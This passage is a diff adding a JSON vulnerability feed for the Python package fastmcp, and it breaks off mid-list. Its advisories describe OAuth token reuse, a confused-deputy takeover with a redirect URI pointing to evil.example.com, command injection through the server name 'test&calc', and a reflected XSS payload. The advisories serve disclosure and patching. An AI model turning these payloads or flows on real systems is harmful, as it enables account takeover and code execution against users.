@@ -1,0 +1,1298 @@
+{
+  "schema_version": 1,
+  "package": "fastmcp",
+  "purls": [
+    "pkg:pypi/fastmcp"
+  ],
+  "generated_at": "2026-05-18T06:01:40+00:00",
+  "conda_versions_total": 30,
+  "advisories": [
+    {
+      "id": "GHSA-5h2m-4q8j-pqpj",
+      "primary_id": "CVE-2025-69196",
+      "aliases": [
+        "CVE-2025-69196"
+      ],
+      "cve_ids": [
+        "CVE-2025-69196"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "fastmcp",
+      "summary": "FastMCP OAuth Proxy token reuse across MCP servers",
+      "details": "While testing the OAuth Proxy implementation, it was noticed that the server does not properly respect the `resource` parameter submitted by the client in the authorization and token request. Instead of issuing the token explicitly for this MCP server, the token is issued for the `base_url` passed to the `OAuthProxy` during initialization. \n\n**Affected File:**\n*https://github.com/jlowin/fastmcp/blob/main/src/fastmcp/server/auth/oauth_proxy.py#L828*\n\n**Affected Code:**\n```python\nself._jwt_issuer: JWTIssuer = JWTIssuer(\n    issuer=str(self.base_url),\n    audience=f\"{str(self.base_url).rstrip('/')}/mcp\",\n    signing_key=jwt_signing_key,\n)\n```\n\nSince the issued access and refresh tokens do not include information about the resource the token was issued for, it is impossible for the MCP server to properly verify whether the token was issued for it, hence violating the requirement of doing so demanded by the [specification](https://mcp.mintlify.app/specification/2025-11-25/basic/authorization#token-audience-binding-and-validation). Being able to verify whether the token was issued for the target MCP server enforces the protections offered by the steps proposed by the specification and the Resource Indicators OAuth extension.\n\nTherefore, this misconfiguration exposes all MCP server setups using the FastMCP OAuth Proxy to an attack where an adversary creates a malicious MCP server that advertises the benign OAuth Proxy authorization server as its own authorization server. Once a victim completes an OAuth flow with this malicious MCP server, authenticating against the AS, the adversary can extract the token received at the malicious MCP server and use it to access other MCP servers (the benign ones) that also use the same AS, including the tools and resources they expose.\n\n**Steps to reproduce:**\n1. Extract the provided [PoC environment](https://github.com/user-attachments/files/23839983/improper_resource_validation_fastmcp.tgz).\n2. Enter the *client_id* and *client_secret* of a GitHub App you control into the `mcp-server-proxy.py` script.\n3. Start the benign MCP server using an OAuth Proxy (in this case the *GitHubProvider*): `python3 mcp-server-proxy.py`.\n4. Start the malicious AS: `python3 mal_auth_server.py`.\n5. Start the malicious MCP server: `python3 attacker_server.py`.\n6. Connect the client to the malicious MCP server: `python3 client.py`.\n7. Complete the OAuth flow.\n8. Observe in the logs of the malicious MCP server that the request to the benign MCP server with the stolen token returned a 200 status code.\n\n## Impact\n\nThis vulnerability allows an adversary to steal a victim\u2019s authentication material for a benign MCP server using the FastMCP OAuth Proxy. The severity of this issue was decreased to _Medium_ due to the consent screen showing the name of the MCP server the OAuth Proxy was intended for. However, a victim might not see it or get otherwise convinced by the attacker to ignore it, and overall this does not act as a proper mitigation for this issue.\n\n## Mitigation\n\nTo mitigate this vulnerability, it is recommended to issue tokens specifically for the MCP server submitted in the authorization URL\u2019s `resource` GET parameter. In this way, the receiving MCP server will be able to properly verify that the token was indeed issued for it, allowing it to reject tokens stolen by an attack like the one demonstrated above.",
+      "published": "2026-03-16T15:14:55Z",
+      "modified": "2026-03-16T22:01:29.783799Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/PrefectHQ/fastmcp/security/advisories/GHSA-5h2m-4q8j-pqpj"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-69196"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/PrefectHQ/fastmcp"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-5h2m-4q8j-pqpj",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.14.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1.0",
+        "0.2.0",
+        "0.3.0",
+        "0.3.1",
+        "0.3.2",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.4.0",
+        "0.4.1",
+        "1.0",
+        "2.0.0",
+        "2.1.0",
+        "2.1.1",
+        "2.1.2",
+        "2.10.0",
+        "2.10.1",
+        "2.10.2",
+        "2.10.3",
+        "2.10.4",
+        "2.10.5",
+        "2.10.6",
+        "2.11.0",
+        "2.11.1",
+        "2.11.2",
+        "2.11.3",
+        "2.12.0",
+        "2.12.0rc1",
+        "2.12.1",
+        "2.12.2",
+        "2.12.3",
+        "2.12.4",
+        "2.12.5",
+        "2.13.0",
+        "2.13.0.1",
+        "2.13.0.2",
+        "2.13.0rc1",
+        "2.13.0rc2",
+        "2.13.0rc3",
+        "2.13.1",
+        "2.13.2",
+        "2.13.3",
+        "2.14.0",
+        "2.14.1",
+        "2.2.0",
+        "2.2.1",
+        "2.2.10",
+        "2.2.2",
+        "2.2.3",
+        "2.2.4",
+        "2.2.5",
+        "2.2.6",
+        "2.2.7",
+        "2.2.8",
+        "2.2.9",
+        "2.3.0",
+        "2.3.0rc1",
+        "2.3.1",
+        "2.3.2",
+        "2.3.3",
+        "2.3.4",
+        "2.3.5",
+        "2.4.0",
+        "2.5.0",
+        "2.5.1",
+        "2.5.2",
+        "2.6.0",
+        "2.6.1",
+        "2.7.0",
+        "2.7.1",
+        "2.8.0",
+        "2.8.1",
+        "2.9.0",
+        "2.9.1",
+        "2.9.2"
+      ],
+      "affected_conda_versions": [
+        "2.3.4",
+        "2.8.1",
+        "2.9.0",
+        "2.9.2",
+        "2.10.1",
+        "2.10.2",
+        "2.10.4",
+        "2.10.5",
+        "2.10.6",
+        "2.11.0",
+        "2.11.1",
+        "2.11.2",
+        "2.11.3",
+        "2.12.0",
+        "2.12.2",
+        "2.12.3",
+        "2.12.4",
+        "2.12.5",
+        "2.13.0.2",
+        "2.13.1",
+        "2.13.2",
+        "2.13.3",
+        "2.14.0",
+        "2.14.1"
+      ]
+    },
+    {
+      "id": "GHSA-c2jp-c369-7pvx",
+      "primary_id": "GHSA-c2jp-c369-7pvx",
+      "aliases": [],
+      "cve_ids": [],
+      "ecosystem": "PyPI",
+      "upstream_name": "fastmcp",
+      "summary": "FastMCP Auth Integration Allows for Confused Deputy Account Takeover",
+      "details": "### Summary\n\nFastMCP documentation [covers the scenario](https://gofastmcp.com/integrations/azure) where it is possible to use Entra ID or other providers for authentication. In this context, because Entra ID does not support Dynamic Client Registration (DCR), the FastMCP-hosted MCP server is acting as the authorization provider, as declared in the Protected Resource Metadata (PRM) document hosted on the server.\n\nFor example, on a local MCP server, it may be hosted here:\n\n```http\nhttp://localhost:8000/.well-known/oauth-protected-resource\n```\n\nAnd the JSON representation of the PRM document:\n\n```json\n{\n  \"resource\": \"http://localhost:8000/mcp\",\n  \"authorization_servers\": [\n    \"http://localhost:8000/\"\n  ],\n  \"scopes_supported\": [\n    \"User.Read\",\n    \"email\",\n    \"openid\",\n    \"profile\"\n  ],\n  \"bearer_methods_supported\": [\n    \"header\"\n  ]\n}\n```\n\nNotice that the `authorization_servers` field contains the MCP server itself - it acts as an **OAuth Client** to the downstream authorization server (e.g., Entra ID) and as a **Authorization Server** (AS) to the MCP client.\n\nThe FastMCP server also hosts the AS metadata:\n\n```bash\nhttp://localhost:8000/.well-known/oauth-authorization-server\n```\n\nWith the following content:\n\n```json\n{\n  \"issuer\": \"http://localhost:8000/\",\n  \"authorization_endpoint\": \"http://localhost:8000/authorize\",\n  \"token_endpoint\": \"http://localhost:8000/token\",\n  \"registration_endpoint\": \"http://localhost:8000/register\",\n  \"scopes_supported\": [\n    \"User.Read\",\n    \"email\",\n    \"openid\",\n    \"profile\"\n  ],\n  \"response_types_supported\": [\n    \"code\"\n  ],\n  \"grant_types_supported\": [\n    \"authorization_code\",\n    \"refresh_token\"\n  ],\n  \"token_endpoint_auth_methods_supported\": [\n    \"client_secret_post\"\n  ],\n  \"code_challenge_methods_supported\": [\n    \"S256\"\n  ]\n}\n```\n\nAll of this confirms that the FastMCP server is, in fact, handling the client-to-server authorization and then delegating the downstream effects (i.e., authorization with Entra ID) to its own redirect logic, with a call like this (as seen through MCP Inspector):\n\n```http\nhttp://localhost:8000/authorize?response_type=code&client_id=fdec0bb8-3423-40d0-aa2a-73de26bf6f93&code_challenge=2a9ZxAEr5NEsKPwFWuEFA1W-kFMXc-02u6qc8aLf_g4&code_challenge_method=S256&redirect_uri=http%3A%2F%2Flocalhost%3A6274%2Foauth%2Fcallback%2Fdebug&state=9f23fd47e2b8786b502f116bdbfd6ae3d7d2801167e24fea82f608bb52312bbd&scope=User.Read+email+openid+profile&resource=http%3A%2F%2Flocalhost%3A8000%2Fmcp\n```\n\nWhen using the built-in FastMCP `/authorize` endpoint, and in the example above, FastMCP server configured with Entra ID, it will then redirect the user here:\n\n```http\nhttps://login.microsoftonline.com/412e93fe-74e5-4ee6-9b67-1eeb1c79550e/oauth2/v2.0/authorize?response_type=code&client_id=7bac43f2-ca62-4148-93a5-fd5686cb16c0&redirect_uri=http%3A%2F%2Flocalhost%3A8000%2Fauth%2Fcallback&state=Tcv7bbg_v0Qi69RHbCzqR4tQHSHKPQuDDxjuo0wu5qU&scope=User.Read+email+openid+profile&code_challenge=bxICFAJDViuTTHIPUPdSXGLKbNbgPwiB-0ITXUJkjYM&code_challenge_method=S256&resource=http%3A%2F%2Flocalhost%3A8000%2Fmcp\n```\n\n>[!NOTE]\n>In the scenario above, the app registration in Entra ID is set up in the FastMCP server, as outlined in the PoC below.\n\n<img width=\"2725\" height=\"630\" alt=\"image\" src=\"https://github.com/user-attachments/assets/7ea612bf-a49e-44da-bd79-236c26bb42f3\" />\n\nNotice that the client ID and redirect URIs in the `login.microsoftonline.com` call are different than the initial `/authorize` call - that's because we're now switching to using the MCP server's **static app registration** instead of the DCR client details.\n\nCompleting the authorization flow here for the first time for a user would trigger the Entra ID consent flow:\n\n<img width=\"751\" height=\"952\" alt=\"image\" src=\"https://github.com/user-attachments/assets/2cc4b7ee-c110-4623-8f86-438821f4addf\" />\n\nThis consent flow is **only showed the first time the user needs to use this application**. Once the consent is set, they will never be prompted for this unless revoked.\n\nThis is where the vulnerability comes in. After the user consented and is authorized, Entra ID will set a browser cookie capturing the authorization state. This helps prevent nagging re-authorization prompts.\n\nWith the user consented to the **static client for Entra ID** that the FastMCP server exposes, they will now not be prompted the next time they need to use the same application ID.\n\nNow, an attacker comes in - in **their own MCP client** (i.e., they maintain one at `https://evil.example.com`) they start the authorization with the same remote MCP server and get to the point where the server produces **their own** authorization URI for this client ID:\n\n```http\nhttp://localhost:8000/authorize?response_type=code&client_id=9a5d63d0-3aa3-465c-b097-0e2e196392dd&code_challenge=2F4Lbfppwd7xuynLT1y4Cy2Dac-S6HOO2B84itAwppw&code_challenge_method=S256&redirect_uri=https%3A%2F%2Fevil.example.com%3A6274%2Foauth%2Fcallback%2Fdebug&state=221fab2ccdc1481511639c110ee7382445930e22be25396b01f32d973d7176dc&scope=User.Read+email+openid+profile&resource=http%3A%2F%2Flocalhost%3A8000%2Fmcp\n```\n\n>[!IMPORTANT]\n>Note that the redirect URI above points to the `https://evil.example.com` client.\n\nAt this point - they grab the URL and **coerce the victim** (user that already authenticated with Entra ID on their machine) to click on this link. This could be done through spam, spear-phishing, or any other traditional link sharing approaches. The moment the victim clicks on this link, they will be taken to the browser, where there is already a cookie set by Entra ID for the **static Entra ID client that the MCP server is using**. The DCR-d **registered client ID** that the FastMCP server is handling now got linked to the internal FastMCP authorization server, and the authorization code is returned to `https://evil.example.com`.\n\nThe user will be automatically speed-ran through the authorization flow (no prompts) and they will effectively give access to the MCP server to the attacker with their account. Attacker can now exchange the authorization code for a token and access the remote MCP server as the victim.\n\n### Details\n\nSee above - the outline covers the attack vector.\n\n### PoC\n\nStandard documented sample that uses Entra ID:\n\n```python\nfrom fastmcp import FastMCP\nfrom fastmcp.server.auth.providers.azure import AzureProvider\n\n# The AzureProvider handles Azure's token format and validation\nauth_provider = AzureProvider(\n    client_id=\"f527ed01-9725-45bd-8173-8d3a017ba02f\",  # Your Azure App Client ID\n    client_secret=\"#####~######_#######\",                 # Your Azure App Client Secret\n    tenant_id=\"412e93fe-74e5-4ee6-9b67-1eeb1c79550e\", # Your Azure Tenant ID (REQUIRED)\n    base_url=\"http://localhost:8000\",                   # Must match your App registration\n    required_scopes=[\"User.Read\", \"email\", \"openid\", \"profile\"],  # Microsoft Graph permissions\n    # redirect_path=\"/auth/callback\"                  # Default value, customize if needed\n)\n\nmcp = FastMCP(name=\"Azure Secured App\", auth=auth_provider)\n\n# Add a protected tool to test authentication\n@mcp.tool\nasync def get_user_info() -> dict:\n    \"\"\"Returns information about the authenticated Azure user.\"\"\"\n    from fastmcp.server.dependencies import get_access_token\n    \n    token = get_access_token()\n    # The AzureProvider stores user data in token claims\n    return {\n        \"azure_id\": token.claims.get(\"sub\"),\n        \"email\": token.claims.get(\"email\"),\n        \"name\": token.claims.get(\"name\"),\n        \"job_title\": token.claims.get(\"job_title\"),\n        \"office_location\": token.claims.get(\"office_location\")\n    }\n```\n\n### Impact\n\nPotential for server account compromise.",
+      "published": "2025-10-29T15:38:07Z",
+      "modified": "2026-02-03T03:11:14.390341Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/jlowin/fastmcp/security/advisories/GHSA-c2jp-c369-7pvx"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/jlowin/fastmcp"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-c2jp-c369-7pvx",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.13.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1.0",
+        "0.2.0",
+        "0.3.0",
+        "0.3.1",
+        "0.3.2",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.4.0",
+        "0.4.1",
+        "1.0",
+        "2.0.0",
+        "2.1.0",
+        "2.1.1",
+        "2.1.2",
+        "2.10.0",
+        "2.10.1",
+        "2.10.2",
+        "2.10.3",
+        "2.10.4",
+        "2.10.5",
+        "2.10.6",
+        "2.11.0",
+        "2.11.1",
+        "2.11.2",
+        "2.11.3",
+        "2.12.0",
+        "2.12.0rc1",
+        "2.12.1",
+        "2.12.2",
+        "2.12.3",
+        "2.12.4",
+        "2.12.5",
+        "2.13.0rc1",
+        "2.13.0rc2",
+        "2.13.0rc3",
+        "2.2.0",
+        "2.2.1",
+        "2.2.10",
+        "2.2.2",
+        "2.2.3",
+        "2.2.4",
+        "2.2.5",
+        "2.2.6",
+        "2.2.7",
+        "2.2.8",
+        "2.2.9",
+        "2.3.0",
+        "2.3.0rc1",
+        "2.3.1",
+        "2.3.2",
+        "2.3.3",
+        "2.3.4",
+        "2.3.5",
+        "2.4.0",
+        "2.5.0",
+        "2.5.1",
+        "2.5.2",
+        "2.6.0",
+        "2.6.1",
+        "2.7.0",
+        "2.7.1",
+        "2.8.0",
+        "2.8.1",
+        "2.9.0",
+        "2.9.1",
+        "2.9.2"
+      ],
+      "affected_conda_versions": [
+        "2.3.4",
+        "2.8.1",
+        "2.9.0",
+        "2.9.2",
+        "2.10.1",
+        "2.10.2",
+        "2.10.4",
+        "2.10.5",
+        "2.10.6",
+        "2.11.0",
+        "2.11.1",
+        "2.11.2",
+        "2.11.3",
+        "2.12.0",
+        "2.12.2",
+        "2.12.3",
+        "2.12.4",
+        "2.12.5"
+      ]
+    },
+    {
+      "id": "GHSA-m8x7-r2rg-vh5g",
+      "primary_id": "CVE-2025-64340",
+      "aliases": [
+        "CVE-2025-64340"
+      ],
+      "cve_ids": [
+        "CVE-2025-64340"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "fastmcp",
+      "summary": "FastMCP has a Command Injection vulnerability - Gemini CLI",
+      "details": "Server names containing shell metacharacters (e.g., `&`) can cause command injection on Windows when passed to `fastmcp install claude-code` or `fastmcp install gemini-cli`. These install paths use `subprocess.run()` with a list argument, but on Windows the target CLIs often resolve to `.cmd` wrappers that are executed through `cmd.exe`, which interprets metacharacters in the flattened command string.\n\nPoC:\n```python\nfrom fastmcp import FastMCP\n\nmcp = FastMCP(name=\"test&calc\")\n\n@mcp.tool\ndef roll_dice(n_dice: int) -> list[int]:\n    \"\"\"Roll `n_dice` 6-sided dice and return the results.\"\"\"\n    return [random.randint(1, 6) for _ in range(n_dice)]\n```\n\n```\nfastmcp install claude-code server.py   # or: fastmcp install gemini-cli server.py\n```\n\nOn Windows, this opens Calculator via the `&calc` in the server name.\n\nImpact:\nArbitrary command execution with the privileges of the user running `fastmcp install`. Affects Windows hosts where the target CLI (one of claude, gemini) is installed as a `.cmd` wrapper. Does not affect macOS/Linux, and does not affect config-file-based install targets (cursor, goose, mcp-json).\n\nPatched in #3522 by validating server names to reject shell metacharacters.",
+      "published": "2026-03-31T22:24:15Z",
+      "modified": "2026-04-06T17:46:56.014360Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/PrefectHQ/fastmcp/security/advisories/GHSA-m8x7-r2rg-vh5g"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jlowin/fastmcp/security/advisories/GHSA-m8x7-r2rg-vh5g"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64340"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/PrefectHQ/fastmcp/pull/3522"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/PrefectHQ/fastmcp"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-m8x7-r2rg-vh5g",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.2.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1.0",
+        "0.2.0",
+        "0.3.0",
+        "0.3.1",
+        "0.3.2",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.4.0",
+        "0.4.1",
+        "1.0",
+        "2.0.0",
+        "2.1.0",
+        "2.1.1",
+        "2.1.2",
+        "2.10.0",
+        "2.10.1",
+        "2.10.2",
+        "2.10.3",
+        "2.10.4",
+        "2.10.5",
+        "2.10.6",
+        "2.11.0",
+        "2.11.1",
+        "2.11.2",
+        "2.11.3",
+        "2.12.0",
+        "2.12.0rc1",
+        "2.12.1",
+        "2.12.2",
+        "2.12.3",
+        "2.12.4",
+        "2.12.5",
+        "2.13.0",
+        "2.13.0.1",
+        "2.13.0.2",
+        "2.13.0rc1",
+        "2.13.0rc2",
+        "2.13.0rc3",
+        "2.13.1",
+        "2.13.2",
+        "2.13.3",
+        "2.14.0",
+        "2.14.1",
+        "2.14.2",
+        "2.14.3",
+        "2.14.4",
+        "2.14.5",
+        "2.14.6",
+        "2.2.0",
+        "2.2.1",
+        "2.2.10",
+        "2.2.2",
+        "2.2.3",
+        "2.2.4",
+        "2.2.5",
+        "2.2.6",
+        "2.2.7",
+        "2.2.8",
+        "2.2.9",
+        "2.3.0",
+        "2.3.0rc1",
+        "2.3.1",
+        "2.3.2",
+        "2.3.3",
+        "2.3.4",
+        "2.3.5",
+        "2.4.0",
+        "2.5.0",
+        "2.5.1",
+        "2.5.2",
+        "2.6.0",
+        "2.6.1",
+        "2.7.0",
+        "2.7.1",
+        "2.8.0",
+        "2.8.1",
+        "2.9.0",
+        "2.9.1",
+        "2.9.2",
+        "3.0.0",
+        "3.0.0b1",
+        "3.0.0b2",
+        "3.0.0rc1",
+        "3.0.0rc2",
+        "3.0.0rc3",
+        "3.0.1",
+        "3.0.2",
+        "3.1.0",
+        "3.1.1"
+      ],
+      "affected_conda_versions": [
+        "2.3.4",
+        "2.8.1",
+        "2.9.0",
+        "2.9.2",
+        "2.10.1",
+        "2.10.2",
+        "2.10.4",
+        "2.10.5",
+        "2.10.6",
+        "2.11.0",
+        "2.11.1",
+        "2.11.2",
+        "2.11.3",
+        "2.12.0",
+        "2.12.2",
+        "2.12.3",
+        "2.12.4",
+        "2.12.5",
+        "2.13.0.2",
+        "2.13.1",
+        "2.13.2",
+        "2.13.3",
+        "2.14.0",
+        "2.14.1",
+        "2.14.2",
+        "2.14.3",
+        "3.0.2",
+        "3.1.0"
+      ]
+    },
+    {
+      "id": "GHSA-mxxr-jv3v-6pgc",
+      "primary_id": "CVE-2025-62800",
+      "aliases": [
+        "CVE-2025-62800"
+      ],
+      "cve_ids": [
+        "CVE-2025-62800"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "fastmcp",
+      "summary": "FastMCP vulnerable to reflected XSS in client's callback page",
+      "details": "### Summary\nWhile setting up an oauth client, it was noticed that the callback page hosted by the client during the flow embeds user-controlled content without escaping or sanitizing it. This leads to a reflected Cross-Site-Scripting vulnerability.\n\n### Details\nThe affected code is located in *https://github.com/jlowin/fastmcp/blob/main/src/fastmcp/client/oauth_callback.py*, which embeds all values passed to the `create_callback_html` function via the `message` parameter it into the callback page without escaping them. This can, for example, be abused by calling the callback server with an XSS payload inside the `error` GET parameter, the value of which will then be inserted into the callback page, causing the execution of attacker-controlled JavaScript code in the callback server's origin. Note that besides the `error` parameter, other parameters reaching this function are affected too.\n\n### PoC\n1. Setup a simple fastmcp client such as this one (the callback server's port was fixated for simplicity):\n\n```\nurl=\"http://127.0.0.1:8000/mcp\"\noauth = OAuth(mcp_url=url,callback_port=1337)\n\nasync def main():\n    async with Client(url, auth=oauth) as client:\n        await client.ping()\n        \n        # List available operations\n        tools = await client.list_tools()\n\n        print(f\"tools: {tools}\")\n       \nasyncio.run(main())\n```\n\n2. Ensure that the MCP server located at `http://127.0.0.1:8000/mcp` supports oauth.\n3. Start the client.\n4. As soon as the callback server has been started, access `http://localhost:1337/callback?error=<img/src/onerror=alert(window.origin)>`\n\nNote that the exploitation could also for example be initiated by a malicious authorization server by returning the exploitation URL mentioned before in the `authorization_endpoint` field. The client would then automatically open, causing the XSS to trigger immediatly.\n\n### Impact\nThe impact of this XSS vulnerability is the arbitrary JavaScript execution in the victim's browser in the callback server's origin.",
+      "published": "2025-10-29T15:38:29Z",
+      "modified": "2025-10-29T15:51:47.307767Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/jlowin/fastmcp/security/advisories/GHSA-mxxr-jv3v-6pgc"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-62800"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jlowin/fastmcp/pull/2090"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jlowin/fastmcp/commit/2a20f54617a37213ed83894a8c2f0ac38a2e83a3"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/jlowin/fastmcp"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-mxxr-jv3v-6pgc",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.13.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1.0",
+        "0.2.0",
+        "0.3.0",
+        "0.3.1",
+        "0.3.2",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.4.0",
+        "0.4.1",
+        "1.0",
+        "2.0.0",
+        "2.1.0",
+        "2.1.1",
+        "2.1.2",
+        "2.10.0",
+        "2.10.1",
+        "2.10.2",
+        "2.10.3",
+        "2.10.4",
+        "2.10.5",
+        "2.10.6",
+        "2.11.0",
+        "2.11.1",
+        "2.11.2",
+        "2.11.3",
+        "2.12.0",
+        "2.12.0rc1",
+        "2.12.1",
+        "2.12.2",
+        "2.12.3",
+        "2.12.4",
+        "2.12.5",
+        "2.13.0rc1",
+        "2.13.0rc2",
+        "2.13.0rc3",
+        "2.2.0",
+        "2.2.1",
+        "2.2.10",
+        "2.2.2",
+        "2.2.3",
+        "2.2.4",
+        "2.2.5",
+        "2.2.6",
+        "2.2.7",
+        "2.2.8",
+        "2.2.9",
+        "2.3.0",
+        "2.3.0rc1",
+        "2.3.1",
+        "2.3.2",
+        "2.3.3",
+        "2.3.4",
+        "2.3.5",
+        "2.4.0",
+        "2.5.0",
+        "2.5.1",
+        "2.5.2",
+        "2.6.0",
+        "2.6.1",
+        "2.7.0",
+        "2.7.1",
+        "2.8.0",
+        "2.8.1",
+        "2.9.0",
+        "2.9.1",
+        "2.9.2"
+      ],
+      "affected_conda_versions": [
+        "2.3.4",
+        "2.8.1",
+        "2.9.0",
+        "2.9.2",
+        "2.10.1",
+        "2.10.2",
+        "2.10.4",
+        "2.10.5",
+        "2.10.6",
+        "2.11.0",
+        "2.11.1",
+        "2.11.2",
+        "2.11.3",
+        "2.12.0",
+        "2.12.2",
+        "2.12.3",
+        "2.12.4",
+        "2.12.5"
+      ]
+    },
+    {
+      "id": "GHSA-rcfx-77hg-w2wv",
+      "primary_id": "GHSA-rcfx-77hg-w2wv",
+      "aliases": [],
+      "cve_ids": [],
+      "ecosystem": "PyPI",
+      "upstream_name": "fastmcp",
+      "summary": "FastMCP updated to MCP 1.23+ due to CVE-2025-66416",
+      "details": "There was a recent CVE report on MCP: https://nvd.nist.gov/vuln/detail/CVE-2025-66416. \n\nFastMCP does not use any of the affected components of the MCP SDK directly. However, FastMCP versions prior to 2.14.0 did allow MCP SDK versions <1.23 that were vulnerable to CVE-2025-66416. Users should upgrade to FastMCP 2.14.0 or later.",
+      "published": "2025-12-26T23:20:50Z",
+      "modified": "2025-12-26T23:27:27.257304Z",
+      "severity": null,
+      "all_severity": [],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/jlowin/fastmcp/security/advisories/GHSA-rcfx-77hg-w2wv"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/modelcontextprotocol/python-sdk/security/advisories/GHSA-9h52-p55h-vw2f"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-66416"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/jlowin/fastmcp"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-rcfx-77hg-w2wv",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.14.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1.0",
+        "0.2.0",
+        "0.3.0",
+        "0.3.1",
+        "0.3.2",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.4.0",
+        "0.4.1",
+        "1.0",
+        "2.0.0",
+        "2.1.0",
+        "2.1.1",
+        "2.1.2",
+        "2.10.0",
+        "2.10.1",
+        "2.10.2",
+        "2.10.3",
+        "2.10.4",
+        "2.10.5",
+        "2.10.6",
+        "2.11.0",
+        "2.11.1",
+        "2.11.2",
+        "2.11.3",
+        "2.12.0",
+        "2.12.0rc1",
+        "2.12.1",
+        "2.12.2",
+        "2.12.3",
+        "2.12.4",
+        "2.12.5",
+        "2.13.0",
+        "2.13.0.1",
+        "2.13.0.2",
+        "2.13.0rc1",
+        "2.13.0rc2",
+        "2.13.0rc3",
+        "2.13.1",
+        "2.13.2",
+        "2.13.3",
+        "2.2.0",
+        "2.2.1",
+        "2.2.10",
+        "2.2.2",
+        "2.2.3",
+        "2.2.4",
+        "2.2.5",
+        "2.2.6",
+        "2.2.7",
+        "2.2.8",
+        "2.2.9",
+        "2.3.0",
+        "2.3.0rc1",
+        "2.3.1",
+        "2.3.2",
+        "2.3.3",
+        "2.3.4",
+        "2.3.5",
+        "2.4.0",
+        "2.5.0",
+        "2.5.1",
+        "2.5.2",
+        "2.6.0",
+        "2.6.1",
+        "2.7.0",
+        "2.7.1",
+        "2.8.0",
+        "2.8.1",
+        "2.9.0",
+        "2.9.1",
+        "2.9.2"
+      ],
+      "affected_conda_versions": [
+        "2.3.4",
+        "2.8.1",
+        "2.9.0",
+        "2.9.2",
+        "2.10.1",
+        "2.10.2",
+        "2.10.4",
+        "2.10.5",
+        "2.10.6",
+        "2.11.0",
